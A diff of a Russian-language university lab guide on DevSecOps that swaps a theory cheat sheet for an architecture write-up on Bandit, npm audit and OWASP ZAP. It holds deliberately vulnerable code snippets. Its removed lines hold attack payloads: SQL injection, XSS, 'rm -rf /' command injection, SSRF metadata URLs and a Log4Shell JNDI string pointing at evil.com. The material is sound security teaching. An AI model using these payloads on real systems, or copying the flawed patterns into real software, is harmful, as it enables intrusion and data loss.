@@ -1,618 +1,474 @@
-# Теория: Безопасность в жизненном цикле разработки ПО (Лаб 13)
+# Полное руководство по архитектуре: Лабораторная работа №13
 
-## 1. DevSecOps и «Shift Left Security»
-
-**DevSecOps** — интеграция безопасности на всех этапах SDLC (Dev + Sec + Ops).
-
-**Три принципа:**
-- **Shared Responsibility** — безопасность = ответственность всей команды
-- **Automation** — автоматические проверки в CI/CD на каждом коммите
-- **Continuous Feedback** — быстрая обратная связь об уязвимостях
-
-**Shift Left** — перенос проверок безопасности как можно раньше:
-```
-Традиционно:   Код → Тест → Релиз → [Проверка безопасности]
-Shift Left:    [Threat Modeling] → Код[SAST/SCA] → Тест[DAST] → Релиз
-```
-
-**Стоимость исправления уязвимости:**
-| Этап | Стоимость |
-|---|---|
-| Требования | $1 |
-| Проектирование | $5–10 |
-| Кодирование | $25–50 |
-| Тестирование | $100–200 |
-| Эксплуатация | $1000+ |
+Этот файл сделан в том же духе, что и теоретический файл из `python-lab-12`: его можно использовать как шпаргалку для защиты. Здесь собрана не только теория по DevSecOps, но и архитектура двух практических частей лабораторной, причины исправлений и готовые формулировки для ответов.
 
 ---
 
-## 2. OWASP Top 10 (2021)
+## 1. Общая идея лабораторной
 
-| # | Категория | Пример |
-|---|---|---|
-| A01 | Broken Access Control | IDOR, нет проверки прав на API |
-| A02 | Cryptographic Failures | MD5 для паролей, HTTP вместо HTTPS |
-| **A03** | **Injection** | **SQL-инъекции, Command Injection** |
-| A04 | Insecure Design | Архитектурные ошибки |
-| A05 | Security Misconfiguration | Открытые порты, дефолтные пароли |
-| **A06** | **Vulnerable Components** | **Устаревшие библиотеки (Log4Shell)** |
-| A07 | Auth Failures | Слабые пароли, нет MFA |
-| A08 | Integrity Failures | Небезопасная десериализация |
-| A09 | Logging Failures | Нет аудита событий |
-| **A10** | **SSRF** | **Запросы к внутренним ресурсам** |
+Лабораторная №13 показывает, что безопасность в SDLC нельзя рассматривать как отдельный финальный этап. В работе демонстрируются три слоя контроля:
+
+1. `SAST` — анализ самого исходного кода до запуска приложения.
+2. `SCA` — анализ сторонних зависимостей и известных CVE.
+3. `DAST` — проверка уже работающего веб-приложения снаружи.
+
+В практической части это разделено на два мини-проекта:
+
+- `python-lab-13.1` — Flask API, где через Bandit и тесты показывается переход от уязвимого Python-кода к безопасному.
+- `python-lab-13.2` — Node.js/Express-приложение с комментариями, где разбираются XSS, SQL injection, hardcoded secrets, CSP и анализ зависимостей.
 
 ---
 
-## 3. Инъекции (Injection) — A03
+## 2. Архитектура лабораторной №13.1: SAST с Bandit
 
-### SQL-инъекция
+### Архитектурная идея
 
-**Уязвимый код (Python):**
-```python
-# ❌ ОПАСНО — конкатенация строк
-query = f"SELECT * FROM users WHERE id = {user_id}"
-cursor.execute(query)
+Первая часть построена как сравнение двух реализаций одного и того же сервиса:
 
-# Атака: user_id = "1 OR 1=1"
-# Результат: SELECT * FROM users WHERE id = 1 OR 1=1
-# Возвращаются ВСЕ пользователи!
+- `vulnerable_app.py` — намеренно уязвимый вариант.
+- `secure_app.py` — исправленный вариант.
+- `test_apps.py` — набор тестов, который подтверждает поведение обоих сценариев.
+- `run_analysis.py` — сценарий запуска Bandit и pytest.
+
+Получается не просто “код + отчёт”, а учебный стенд, где видно и уязвимость, и её исправление, и подтверждение тестами.
+
+```mermaid
+graph TD
+    A["HTTP client / curl / pytest"] --> B["Flask app"]
+    B --> C["Input validation layer"]
+    C --> D["SQLite queries"]
+    B --> E["Command execution endpoint"]
+    F["Bandit"] --> G["Source code scan"]
+    H["pytest"] --> I["Behavior verification"]
 ```
 
-**Безопасный код:**
-```python
-# ✅ ПАРАМЕТРИЗОВАННЫЙ запрос
-query = "SELECT * FROM users WHERE id = ?"
-cursor.execute(query, (user_id,))
-# Драйвер БД экранирует значение — "1 OR 1=1" воспринимается как строка
-```
+### Логическая структура приложения
 
-**Почему параметризация защищает:** база данных разделяет код запроса и данные. Значение `user_id` никогда не интерпретируется как SQL-код, только как строка.
+Во Flask-части есть четыре ключевых сценария:
 
-### Command Injection
+1. Получение пользователя по `id`.
+2. Поиск пользователей по `username`.
+3. Доступ к чувствительным данным через `/api/data`.
+4. Выполнение команды через `/execute`.
 
-**Уязвимый код:**
-```python
-# ❌ ОПАСНО — shell=True с пользовательским вводом
-import subprocess
-cmd = request.args.get('cmd')
-result = subprocess.check_output(cmd, shell=True)
-# Атака: cmd = "ls; rm -rf /"
-```
+Именно на этих сценариях показаны типовые проблемы secure coding:
 
-**Безопасный код:**
-```python
-# ✅ Allow-list + shell=False
-ALLOWED = ['date', 'whoami', 'uptime']
-cmd = request.args.get('cmd', '')
-if cmd not in ALLOWED:
-    return jsonify({"error": "Command not allowed"}), 403
-result = subprocess.check_output([cmd])  # shell=False — без оболочки
-```
+- SQL injection.
+- Hardcoded secrets.
+- Command injection.
+- Небезопасный debug-режим.
 
-**Разница `shell=True` vs `shell=False`:**
-- `shell=True` — запускает `/bin/sh -c "команда"`, позволяет `;`, `&&`, `|`
-- `shell=False` — запускает программу напрямую, без интерпретатора оболочки
+### Что было уязвимо в `vulnerable_app.py`
 
-### SQL-инъекция в Node.js
+#### SQL injection
 
-```javascript
-// ❌ ОПАСНО
-db.all(`SELECT * FROM comments WHERE comment LIKE '%${search}%'`);
-
-// ✅ БЕЗОПАСНО — параметризованный запрос
-db.all(`SELECT * FROM comments WHERE comment LIKE ?`, [`%${search}%`]);
-
-// ✅ БЕЗОПАСНО — allow-list для динамической сортировки
-const ALLOWED_SORT = ['created_at DESC', 'created_at ASC', 'username ASC'];
-if (!ALLOWED_SORT.includes(sortParam)) return res.status(400).json({error: 'Invalid sort'});
-db.all(`SELECT * FROM comments ORDER BY ${sortParam}`);
-```
-
----
-
-## 4. XSS (Cross-Site Scripting)
-
-**Определение:** внедрение JavaScript-кода в страницу, выполняющегося в браузере жертвы.
-
-### Типы XSS
-
-| Тип | Механизм | Опасность |
-|---|---|---|
-| **Reflected** | Скрипт в URL-параметре, отражается в ответе | Средняя (нужна ссылка) |
-| **Stored** | Скрипт сохранён в БД, отображается всем | Высокая (атакует всех) |
-| **DOM-based** | Скрипт через JavaScript на клиенте | Сложно обнаружить |
-
-### Уязвимый код
-
-```javascript
-// ❌ innerHTML с пользовательскими данными
-html += '<div>' + comment.comment + '</div>';
-document.getElementById('result').innerHTML = html;
-
-// ❌ eval с пользовательским вводом
-eval(userInput); // НИКОГДА!
-```
-
-### Безопасный код
-
-```javascript
-// ✅ Создание DOM-элементов через API
-const div = document.createElement('div');
-div.textContent = comment.comment; // textContent — автоматически экранирует HTML
-container.appendChild(div);
-```
-
-**В EJS-шаблонах:**
-```ejs
-<!-- ✅ Безопасно — экранирует HTML -->
-<%= comment.comment %>
-
-<!-- ❌ Опасно — raw HTML -->
-<%- comment.comment %>
-```
-
-### Content Security Policy (CSP)
-
-CSP — HTTP-заголовок, ограничивающий источники ресурсов в браузере:
-
-```javascript
-// Express.js
-app.use((req, res, next) => {
-    res.setHeader(
-        'Content-Security-Policy',
-        "default-src 'self'; script-src 'self'; style-src 'self';"
-    );
-    next();
-});
-```
-
-**Режим отчёта (без блокировки):**
-```
-Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
-```
-
-CSP защищает даже если разработчик забыл экранировать вывод: браузер не выполнит скрипт из неразрешённого источника.
-
-### Санитизация данных
-
-```javascript
-const sanitizeHtml = (input) => {
-    if (!input) return '';
-    return input
-        .replace(/&/g, '&amp;')
-        .replace(/</g, '&lt;')
-        .replace(/>/g, '&gt;')
-        .replace(/"/g, '&quot;')
-        .replace(/'/g, '&#x27;');
-};
-```
-
----
-
-## 5. Hardcoded Secrets
-
-**Что такое «секреты»:** API-ключи, пароли к БД, JWT-секреты, OAuth-токены, приватные ключи.
+Уязвимость возникала из-за конкатенации строк:
 
 ```python
-# ❌ НИКОГДА ТАК НЕ ДЕЛАТЬ
-API_KEY = "sk_test_REPLACED"
-DATABASE_URL = "postgresql://admin:SuperSecret123!@db.example.com/prod"
+query = f"SELECT id, username, email FROM users WHERE id = {user_id}"
 ```
 
-**Почему опасно:**
-- Git-история хранит всё — удаление из HEAD не удаляет из истории
-- Публичные репозитории сканируются ботами за секунды
-- Даже приватные репо компрометируются при утечке токена
+Проблема в том, что значение `user_id` попадало в SQL как часть запроса, а не как данные.
 
-**Правильно — переменные окружения:**
+#### Hardcoded secret
+
+Секрет был зашит прямо в код:
+
 ```python
-import os
+API_KEY = "demo_training_key_do_not_use"
+```
 
+Это опасно, потому что секрет попадает в Git-историю и может быть утянут даже после удаления из последнего коммита.
+
+#### Command injection
+
+Команда выполнялась так:
+
+```python
+subprocess.check_output(cmd, shell=True, text=True)
+```
+
+При `shell=True` пользователь может передать цепочку команд через `;`, `&&`, `|`.
+
+#### `debug=True`
+
+Bandit помечает такой запуск как рискованный:
+
+```python
+app.run(debug=True, host='0.0.0.0', port=5000)
+```
+
+В production это приводит к утечке деталей о внутреннем устройстве приложения.
+
+### Что изменено в `secure_app.py`
+
+#### Валидация входных данных
+
+Сначала ввод проходит через функцию `validate_integer`, а потом уже используется в БД.
+
+Это важно, потому что защита строится в два слоя:
+
+- параметризованный запрос разделяет код и данные;
+- валидация ещё раньше отсекает явно некорректный ввод.
+
+#### Параметризованные запросы
+
+Используется безопасная форма:
+
+```python
+cursor = conn.execute(
+    "SELECT id, username, email FROM users WHERE id = ?",
+    (uid,)
+)
+```
+
+То же самое сделано для `LIKE`-поиска.
+
+#### Секреты вынесены в переменные окружения
+
+```python
 API_KEY = os.environ.get('API_KEY')
-if not API_KEY:
-    raise ValueError("API_KEY environment variable not set")
 ```
 
-**Запуск:**
-```bash
-export API_KEY="your-secure-key"
-python app.py
-```
+Это стандартная практика DevSecOps: код не хранит чувствительные значения, а получает их из среды выполнения.
 
-**Продвинутый вариант — HashiCorp Vault:**
+#### Allow-list для системных команд
+
 ```python
-import hvac
-client = hvac.Client(url='https://vault.internal:8200',
-                     token=os.environ.get('VAULT_TOKEN'))
-secret = client.secrets.kv.v2.read_secret_version(mount_point='kv', path='prod/db')
-db_password = secret['data']['data']['password']
+ALLOWED_COMMANDS = ['date', 'whoami', 'uptime', 'hostname']
 ```
+
+И дальше:
+
+```python
+result = subprocess.check_output([cmd], text=True)
+```
+
+Ключевое отличие:
+
+- `shell=False`;
+- команда выбирается только из белого списка;
+- пользователь не может изменить логику выполнения оболочки.
+
+#### Безопасная обработка ошибок
+
+В secure-версии ошибки логируются на сервере, а клиенту отдаётся общее сообщение:
+
+```python
+return jsonify({"error": "Internal server error"}), 500
+```
+
+Это уменьшает риск information disclosure.
+
+### Почему здесь нужен именно Bandit
+
+Bandit хорошо подходит для Python-кода, потому что умеет искать шаблонные опасные конструкции:
+
+- `B105` — hardcoded password string;
+- `B201` — Flask `debug=True`;
+- `B602` — `subprocess` с `shell=True`;
+- `B608` — потенциальные SQL-инъекции через строковую сборку.
+
+Bandit не “доказывает атаку”, а находит подозрительные фрагменты исходного кода. Поэтому после него нужен второй слой — тесты и ручная интерпретация результата.
 
 ---
 
-## 6. SAST — Статический анализ (Bandit)
+## 3. Архитектура лабораторной №13.2: OWASP, XSS, SCA
 
-**SAST (Static Application Security Testing)** — анализ исходного кода без его выполнения.
+### Архитектурная идея
 
-**Bandit** — Python-инструмент для поиска уязвимостей в коде.
+Вторая часть тоже сделана в форме сравнения двух реализаций:
 
-### Установка и запуск
+- `vulnerable_app.js` — намеренно небезопасный вариант Express-приложения;
+- `secure_app.js` — исправленный вариант;
+- `views/index_vulnerable.ejs` и `views/index_secure.ejs` — шаблоны для демонстрации XSS;
+- `test_runner.js` — автоматический сценарий проверки уязвимого и защищённого поведения.
 
-```bash
-pip install bandit
-
-# Базовый запуск
-bandit app.py
-
-# С уровнем серьёзности (low/medium/high)
-bandit app.py -ll   # только low и выше
-bandit app.py -l    # только medium и выше
-
-# Генерация отчёта
-bandit app.py -f html -o bandit_report.html
-bandit app.py -f json -o bandit_report.json
-
-# Исключить конкретные проверки
-bandit app.py -s B608  # пропустить B608 (hardcoded SQL)
+```mermaid
+graph TD
+    A["Browser / fetch / curl"] --> B["Express routes"]
+    B --> C["Validation and sanitization"]
+    C --> D["SQLite comments.db"]
+    B --> E["EJS templates"]
+    E --> F["Browser DOM"]
+    G["npm audit / SCA"] --> H["package.json + package-lock.json"]
+    I["OWASP ZAP / DAST"] --> A
 ```
 
-### Что находит Bandit
+### Почему эта часть ближе к реальной веб-безопасности
 
-| Код | Уязвимость | Серьёзность |
-|---|---|---|
-| B105 | Hardcoded password | Low |
-| B106 | Hardcoded password as argument | Low |
-| B108 | Probable insecure temp file | Medium |
-| **B201** | **Flask debug=True** | **High** |
-| **B323** | **Unverified HTTPS context** | **Medium** |
-| **B501** | **Weak cryptographic key** | **Medium** |
-| **B602** | **subprocess with shell=True** | **High** |
-| **B608** | **SQL injection** | **Medium** |
+Если первая часть показывает secure coding на уровне исходника, то вторая уже демонстрирует многослойную веб-защиту:
 
-### Конфигурационный файл `.bandit`
+- безопасная работа с шаблонами;
+- экранирование и санитизация;
+- заголовки безопасности;
+- контроль сортировки через allow-list;
+- безопасная выдача конфигурации;
+- анализ зависимостей.
 
-```yaml
-# .bandit
-skips: ['B105']          # пропустить проверки
-tests: ['B201', B602']   # только эти проверки
-exclude_dirs: ['tests', 'venv']  # исключить папки
+### Что было уязвимо в `vulnerable_app.js`
+
+#### Stored XSS
+
+Данные из формы сохранялись почти без защиты и потом рендерились в шаблоне через:
+
+```ejs
+<%- c.comment %>
 ```
 
-### Что Bandit НЕ находит
+`<%- %>` вставляет raw HTML, то есть любой `<script>` из БД попадёт в страницу как исполняемый код.
 
-- Логические ошибки в бизнес-логике (IDOR, broken access control)
-- Уязвимости в конфигурации сервера
-- Уязвимости во время выполнения (runtime)
-- XSS на стороне клиента (JavaScript)
-- Проблемы аутентификации и авторизации
+#### DOM XSS через `innerHTML`
 
----
-
-## 7. SCA — Анализ зависимостей
-
-**SCA (Software Composition Analysis)** — поиск уязвимостей в сторонних библиотеках.
-
-### npm audit (Node.js)
-
-```bash
-# Установка уязвимых версий специально
-npm install express@4.16.0 axios@0.18.0 ejs@2.6.1
-
-# Аудит
-npm audit
-npm audit --json > audit-report.json
-
-# Автоматическое исправление
-npm audit fix
-npm audit fix --force  # для major-версий
-
-# Обновить конкретный пакет
-npm install express@latest
-```
-
-**Пример вывода npm audit:**
-```
-axios  <0.21.2
-Severity: moderate
-Server-Side Request Forgery in axios - https://npmjs.com/advisories/...
-fix available via `npm audit fix --force`
-```
-
-### pip-audit (Python)
-
-```bash
-pip install pip-audit
-pip-audit
-pip-audit -r requirements.txt
-pip-audit --format json > audit.json
-```
-
-### Snyk
-
-```bash
-npm install -g snyk
-snyk auth
-snyk test
-snyk monitor  # Мониторинг в облаке
-```
-
-**Разница npm audit vs snyk:**
-- `npm audit` — только NPM Advisory Database
-- `snyk` — несколько баз (NVD, GitHub Advisory, собственная), глубже транзитивные зависимости, fix-советы
-
----
-
-## 8. DAST — Динамическое тестирование (OWASP ZAP)
-
-**DAST (Dynamic Application Security Testing)** — сканирование работающего приложения («чёрный ящик»).
-
-**OWASP ZAP** — самый популярный open-source DAST-инструмент.
-
-### Запуск через Docker
-
-```bash
-# Пассивное сканирование (без активных атак)
-docker run -v $(pwd):/zap/wrk -t owasp/zap2docker-stable \
-    zap-baseline.py -t http://localhost:3000 -r zap_report.html
-
-# Полное активное сканирование
-docker run -v $(pwd):/zap/wrk -t owasp/zap2docker-stable \
-    zap-full-scan.py -t http://localhost:3000 -r full_report.html
-
-# Для API
-docker run -v $(pwd):/zap/wrk -t owasp/zap2docker-stable \
-    zap-api-scan.py -t http://localhost:3000/swagger.json -r api_report.html
-```
-
-### Как ZAP обнаруживает XSS
-
-1. **Spider** — обходит все страницы, собирает формы и URL-параметры
-2. **Active Scan** — для каждого параметра отправляет тестовые payload'ы:
-   - `<script>alert(1)</script>`
-   - `"><img src=x onerror=alert(1)>`
-   - `javascript:alert(1)`
-3. **Анализ ответа** — ищет, отражается ли payload в ответе без экранирования
-
-### Passive vs Active сканирование
-
-| | Пассивное | Активное |
-|---|---|---|
-| Воздействие | Нет атак | Отправляет exploit payload'ы |
-| Данные | Может изменить | Безопасно |
-| Время | Быстро | Медленно (часы) |
-| Когда | Всегда | Только в тестовой среде |
-
----
-
-## 9. SSRF (Server-Side Request Forgery) — A10
-
-**SSRF** — приложение выполняет HTTP-запросы по URL, контролируемому пользователем.
+В JavaScript-коде комментарии подставлялись в строку HTML, а затем вставлялись через:
 
 ```javascript
-// ❌ УЯЗВИМЫЙ КОД — axios принимает любой URL
-app.get('/api/external', async (req, res) => {
-    const url = req.query.url;
-    const response = await axios.get(url); // Атака: url=http://169.254.169.254/...
-    res.json(response.data);
-});
+document.getElementById('api-result').innerHTML = html;
 ```
 
-**Что можно атаковать:**
-- `http://169.254.169.254/latest/meta-data/` — метаданные AWS (ключи доступа!)
-- `http://localhost:8080/admin` — внутренние сервисы
-- `http://192.168.1.1/` — серверы внутренней сети
+Это ещё один путь для XSS — уже на клиентской стороне.
 
-**Защита:**
+#### SQL injection через сортировку
+
+Уязвимый код строил выражение:
+
 ```javascript
-const { URL } = require('url');
-const ALLOWED_HOSTS = ['api.example.com', 'api2.example.com'];
-
-app.get('/api/external', async (req, res) => {
-    try {
-        const parsed = new URL(req.query.url);
-        if (!ALLOWED_HOSTS.includes(parsed.hostname))
-            return res.status(403).json({ error: 'Host not allowed' });
-        if (parsed.protocol !== 'https:')
-            return res.status(403).json({ error: 'Only HTTPS allowed' });
-        const response = await axios.get(req.query.url);
-        res.json(response.data);
-    } catch { res.status(400).json({ error: 'Invalid URL' }); }
-});
+db.all(`SELECT * FROM comments ORDER BY ${sort}`)
 ```
+
+Для `ORDER BY` не получится использовать обычный placeholder вместо имени поля, поэтому тут нужен allow-list.
+
+#### SQL injection в поиске
+
+Здесь использовалась конкатенация строки с `LIKE`.
+
+#### Hardcoded config / debug data
+
+Эндпоинт `/api/config` отдавал API key и флаг debug, то есть сам раскрывал чувствительные детали среды.
+
+### Что исправлено в `secure_app.js`
+
+#### Серверная санитизация
+
+Входные значения очищаются функцией `sanitizeHtml` до сохранения в БД.
+
+Это не заменяет все остальные меры, но сильно снижает риск Stored XSS.
+
+#### Безопасный вывод в шаблоне
+
+В `index_secure.ejs` используется:
+
+```ejs
+<%= c.comment %>
+```
+
+А `EJS` в таком режиме экранирует HTML автоматически.
+
+#### Отказ от `innerHTML`
+
+Во фронтенд-части используются `document.createElement` и `textContent`, то есть браузер получает текст, а не исполняемый HTML.
+
+#### CSP и security headers
+
+Secure-версия выставляет:
+
+- `Content-Security-Policy`;
+- `X-Content-Type-Options`;
+- `X-Frame-Options`;
+- `X-XSS-Protection`.
+
+Это важно как второй слой защиты, если разработчик всё же где-то пропустил экранирование.
+
+#### Allow-list для сортировки
+
+Вместо произвольной строки используется фиксированный набор допустимых выражений:
+
+```javascript
+const ALLOWED_SORT = ['created_at DESC', 'created_at ASC', 'username ASC', 'username DESC'];
+```
+
+Это правильный способ для динамического `ORDER BY`.
+
+#### Параметризованный поиск
+
+Поиск по комментариям переведён на:
+
+```javascript
+db.all(`SELECT * FROM comments WHERE comment LIKE ?`, [`%${search}%`], ...)
+```
+
+#### Секреты вынесены из кода
+
+Secure-приложение требует `API_KEY` из среды и не возвращает его наружу.
+
+### Что даёт `npm audit`
+
+`npm audit` относится к классу `SCA` и анализирует не ваш код, а зависимости и известные для них CVE.
+
+Идея очень важная для защиты:
+
+- даже если вы пишете идеальный код;
+- приложение всё равно уязвимо, если в `node_modules` лежат пакеты с критическими CVE.
+
+Это как раз типичная логика OWASP A06: Vulnerable and Outdated Components.
 
 ---
 
-## 10. Сравнение SAST / DAST / SCA
+## 4. Связь лабы с OWASP Top 10
 
-| Характеристика | SAST | DAST | SCA |
+В этой лабораторной напрямую затрагиваются следующие категории:
+
+| Категория | Где показана |
+|---|---|
+| `A03: Injection` | SQL injection в Flask и Node.js, command injection в Flask |
+| `A05: Security Misconfiguration` | `debug=True`, утечка config, отсутствие security headers |
+| `A06: Vulnerable and Outdated Components` | `npm audit`, анализ зависимостей |
+| `A08: Software and Data Integrity Failures` | Риск небезопасных зависимостей и цепочки поставки |
+| `A09: Security Logging and Monitoring Failures` | Разница между безопасной и небезопасной обработкой ошибок |
+| `A10: SSRF` | Упоминается в теории как пример риска у уязвимых HTTP-клиентов |
+
+Дополнительно через XSS показывается классическая веб-угроза клиентской стороны, которая хотя и не выделена как отдельный пункт в OWASP Top 10 2021, но остаётся ключевой практической проблемой.
+
+---
+
+## 5. Почему лабораторная отражает DevSecOps
+
+Лаба специально собрана не как “один фикс”, а как цепочка контроля:
+
+```mermaid
+graph LR
+    A["Developer writes code"] --> B["SAST: Bandit"]
+    B --> C["Unit/integration tests"]
+    C --> D["SCA: npm audit"]
+    D --> E["DAST: OWASP ZAP"]
+    E --> F["Deployment decision"]
+```
+
+Идея DevSecOps здесь такая:
+
+1. Безопасность проверяется не один раз перед релизом.
+2. Разные инструменты смотрят на систему под разными углами.
+3. Результаты автоматизируются и могут встраиваться в CI/CD.
+
+### Чем отличаются SAST, SCA и DAST
+
+| Характеристика | SAST | SCA | DAST |
 |---|---|---|---|
-| Когда | При коммите/PR | На staging | При сборке |
-| Код нужен | Да (белый ящик) | Нет (чёрный ящик) | Только манифест |
-| Что находит | SQLi, XSS в коде | Конфигурация, логика | CVE в зависимостях |
-| Ложные срабатывания | Высокие | Средние | Низкие |
-| Скорость | Быстро (мин) | Медленно (часы) | Быстро (сек) |
-| Инструменты | Bandit, Semgrep | OWASP ZAP, Burp | npm audit, Snyk |
+| Что анализирует | Исходный код | Зависимости | Рабочее приложение |
+| Нужен ли запуск | Нет | Нет | Да |
+| Что находит | Уязвимые конструкции в коде | CVE в пакетах | Ошибки поведения и конфигурации |
+| Когда запускать | На коммите/PR | При сборке и обновлении пакетов | На staging |
 
-**Вывод:** нужны все три класса. SAST + SCA на каждом PR, DAST на staging.
+### Почему одного инструмента недостаточно
 
----
+- Bandit не скажет, что библиотека в `package.json` уязвима.
+- `npm audit` не поймёт, что у вас `shell=True`.
+- ZAP не увидит каждую потенциальную проблему в ветке кода, если эта ветка не была вызвана.
 
-## 11. Безопасные практики кодирования
-
-### Валидация входных данных
-
-```python
-import re
-
-# Allow-list (позитивная валидация) — лучший подход
-def validate_username(username):
-    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
-        raise ValueError("Invalid username")
-    return username
-
-# Никогда не использовать block-list (черный список) — всегда можно обойти
-```
-
-### Хэширование паролей
-
-```python
-# ❌ ОПАСНО — MD5, SHA1 без соли
-import hashlib
-hash = hashlib.md5(password.encode()).hexdigest()
-
-# ✅ ПРАВИЛЬНО — bcrypt или argon2
-import bcrypt
-hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
-```
-
-### Обработка ошибок
-
-```python
-# ❌ Выводим stack trace пользователю
-@app.errorhandler(Exception)
-def handle_error(e):
-    return str(e), 500  # Атакующий видит структуру приложения!
-
-# ✅ Логируем на сервере, пользователю — общее сообщение
-import logging
-@app.errorhandler(Exception)
-def handle_error(e):
-    logging.exception("Internal error")
-    return jsonify({"error": "Internal server error"}), 500
-```
+Отсюда главный вывод: DevSecOps — это композиция инструментов, а не ставка на один сканер.
 
 ---
 
-## 12. Конвейер безопасности в CI/CD
+## 6. Практические аргументы для защиты
 
-```
-Коммит → [Pre-commit: git-secrets] → PR → [SAST + SCA + Secrets Scan]
-                                              ↓ критические = блокировка PR
-                                         Сборка → [Container Scan]
-                                              ↓
-                                         Staging → [DAST: OWASP ZAP]
-                                              ↓ уязвимости = блокировка деплоя
-                                         Production → [Runtime Monitoring]
-```
+### Почему параметризованный запрос защищает от SQL injection
 
-### GitHub Actions пример
+Потому что SQL-код и пользовательские данные передаются отдельно. База данных получает шаблон запроса и набор значений, но не интерпретирует значение как часть SQL-синтаксиса.
 
-```yaml
-name: Security Scan
-on: [pull_request]
+### Почему `shell=False` безопаснее
 
-jobs:
-  security:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v3
-      
-      - name: Python SAST (Bandit)
-        run: pip install bandit && bandit -r . -ll
-      
-      - name: Node.js SCA (npm audit)
-        run: npm audit --audit-level=high
-      
-      - name: Snyk test
-        run: npx snyk test
-        env:
-          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
-```
+Потому что команда запускается напрямую, без оболочки. Пользователь не может добавить `;`, `&&`, `|` и превратить одну команду в цепочку команд.
+
+### Почему allow-list лучше blacklist
+
+Blacklist пытается перечислить плохие варианты, а allow-list разрешает только заведомо безопасные. В безопасности почти всегда выигрывает allow-list.
+
+### Почему одного экранирования мало против XSS
+
+Потому что защита должна быть многослойной:
+
+1. Санитизация/валидация ввода.
+2. Безопасный вывод в шаблоне.
+3. Безопасная работа с DOM.
+4. CSP как дополнительный барьер.
+
+### Почему секреты нельзя хранить в коде
+
+Потому что код уходит в Git, резервные копии, логи, форки и CI. Даже удалённый из текущего файла секрет часто остаётся в истории.
 
 ---
 
-## 13. Ключевые кейсы
+## 7. Что можно показать преподавателю на запуске
 
-### Log4Shell (CVE-2021-44228, декабрь 2021)
+### Часть 13.1
 
-- **Библиотека:** Apache Log4j (Java), используется в миллионах приложений
-- **Уязвимость:** строка `${jndi:ldap://evil.com/exploit}` в логах → RCE
-- **CVSS:** 10.0 (максимум)
-- **Урок:** SCA + SBOM необходимы для быстрой оценки влияния новых CVE
-
-### SolarWinds (2020)
-
-- **Атака:** компрометация CI/CD пайплайна, бэкдор в официальных обновлениях
-- **Масштаб:** 18 000 организаций, включая правительство США
-- **Урок:** CI/CD — критическая инфраструктура, требует такой же защиты как production
-
----
-
-## 14. Ответы на вопросы лабораторных
-
-### Лаб 13.1 (SAST / Bandit)
-
-**Q: Какие уязвимости обнаружил Bandit?**
-- B105/B106 — hardcoded passwords (API_KEY в коде)
-- B201 — `app.run(debug=True)` — в production опасно, раскрывает отладчик
-- B602 — `subprocess.check_output(cmd, shell=True)` — Command Injection
-- B608 — SQL built with string formatting — SQL Injection
-
-**Q: Почему параметризованные запросы защищают от SQLi?**
-БД разделяет SQL-структуру и данные. Значение передаётся отдельно и никогда не интерпретируется как SQL-код, только как строковое значение.
-
-**Q: Разница shell=True vs shell=False?**
-`shell=True` запускает команду через `/bin/sh -c`, что позволяет использовать `;`, `&&`, `|` для цепочки команд. `shell=False` запускает программу напрямую — пользовательский ввод не может изменить логику выполнения.
-
-**Q: Что SAST НЕ обнаруживает?**
-- Ошибки логики (IDOR, нарушение контроля доступа)
-- Уязвимости конфигурации среды (открытые порты)
-- Уязвимости, возникающие при взаимодействии компонентов
-- Проблемы в сторонних библиотеках (это задача SCA)
-
-### Лаб 13.2 (SCA / OWASP ZAP)
-
-**Q: Какие CVE в зависимостях?**
-- `axios@0.18.0` → CVE-2023-45857 (SSRF), CVE-2020-28168
-- `ejs@2.6.1` → CVE-2022-29078 (RCE через шаблоны)
-- `express@4.16.0` → несколько Low/Medium severity
-
-**Q: Разница npm audit vs snyk?**
-`npm audit` — только npm Advisory Database, бесплатно. `snyk` — несколько баз данных, глубокий анализ транзитивных зависимостей, платный, предоставляет пошаговые инструкции по исправлению.
-
-**Q: Почему CSP эффективен против XSS?**
-Даже если XSS-скрипт внедрён в HTML, браузер проверяет его источник по политике. Если источник не разрешён — скрипт не выполнится. CSP — второй слой защиты после экранирования.
-
-**Q: Ограничения DAST vs SAST?**
-DAST не видит код, только внешнее поведение. Не находит уязвимости в ветках кода, которые не были вызваны при сканировании. Медленнее. Может повредить тестовые данные активным сканированием.
-
----
-
-## 15. Быстрые команды (шпаргалка)
+Из директории `python-lab-13.1`:
 
 ```bash
-# ── Python / Bandit ──────────────────────────────
-pip install flask bandit
-bandit app.py                          # базовый анализ
-bandit app.py -f html -o report.html  # HTML-отчёт
-bandit app.py -r -ll                  # рекурсивно, medium+
-bandit -c .bandit app.py              # с конфигом
-
-# ── Node.js / npm ────────────────────────────────
-npm audit                              # аудит зависимостей
-npm audit fix                          # автоисправление
-npm audit fix --force                  # включая major
-npm outdated                           # устаревшие пакеты
-npx snyk test                          # snyk без установки
-
-# ── OWASP ZAP (Docker) ──────────────────────────
-docker pull owasp/zap2docker-stable
-docker run -v $(pwd):/zap/wrk -t owasp/zap2docker-stable \
-    zap-baseline.py -t http://localhost:3000 -r report.html
-
-# ── Проверка заголовков CSP ─────────────────────
-curl -I http://localhost:3000 | grep -i content-security-policy
-
-# ── Тест SQL-инъекции ───────────────────────────
-curl "http://localhost:5000/user?id=1 OR 1=1"
-curl "http://localhost:5000/search?username=admin' OR '1'='1"
-
-# ── Тест XSS ────────────────────────────────────
-curl -X POST http://localhost:3000/comment \
-    -d "username=<script>alert('xss')</script>&comment=test"
-
-# ── Переменные окружения ─────────────────────────
-export API_KEY="secure-key-here"
-echo $API_KEY
-unset API_KEY
+python run_analysis.py
 ```
+
+Этот сценарий:
+
+- ставит Python-зависимости;
+- запускает Bandit для `vulnerable_app.py`;
+- формирует `bandit_before.html` и `bandit_before.json`;
+- запускает Bandit для `secure_app.py`;
+- формирует `bandit_after.html` и `bandit_after.json`;
+- прогоняет `pytest`.
+
+### Часть 13.2
+
+Из директории `python-lab-13.2`:
+
+```bash
+npm test
+```
+
+Скрипт `test_runner.js` автоматически:
+
+- поднимает уязвимое приложение;
+- подтверждает, что оно светит secret и пропускает stored XSS;
+- поднимает защищённое приложение;
+- проверяет CSP;
+- проверяет блокировку некорректной сортировки;
+- проверяет, что XSS рендерится уже в экранированном виде.
+
+Если нужен ручной показ:
+
+```bash
+npm run start:vulnerable
+npm run start:secure
+```
+
+---
+
